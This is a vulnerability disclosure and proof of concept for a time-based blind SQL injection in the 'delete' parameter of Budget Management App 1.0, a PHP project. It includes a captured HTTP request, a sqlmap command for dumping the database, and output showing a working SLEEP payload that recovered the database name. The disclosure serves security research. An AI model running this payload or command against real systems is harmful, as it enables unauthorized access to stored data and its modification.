# Budget Management App - SQL Injection - 2
+ **Exploit Title:** Budget Management App - SQL Injection - 2
+ **Date:** 2024-12-05
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://code-projects.org/budget-management-in-php-with-source-code/
+ **Software Link:** https://download.code-projects.org/details/1c10fce2-3260-479b-878f-b2107dec72f9
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Budget Management App 1.0 allows SQL Injection via the 'delete' parameter at "http://localhost//PHP-Budget-Calculator/index.php?delete=1. 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/PHP-Budget-Calculator/index.php"
+ Click delete button.
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /PHP-Budget-Calculator/process.php?delete=1 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
```

+ Use sqlmap to exploit. In sqlmap, use 'delete' parameter to dump the database.
```
sqlmap -r r.txt -p delete --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: delete (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: delete=1 AND (SELECT 6895 FROM (SELECT(SLEEP(5)))zXgn)
---
[10:52:57] [INFO] the back-end DBMS is MySQL
[10:52:57] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[10:53:02] [INFO] fetching current database
current database: 'budget_calculator'
```
+ current database: `budget_calculator`

![Ekran görüntüsü 2024-05-15 225555](https://github.com/BurakSevben/CVEs/assets/117217689/fa24e501-bb9d-4b44-961b-281b1294c3d7)
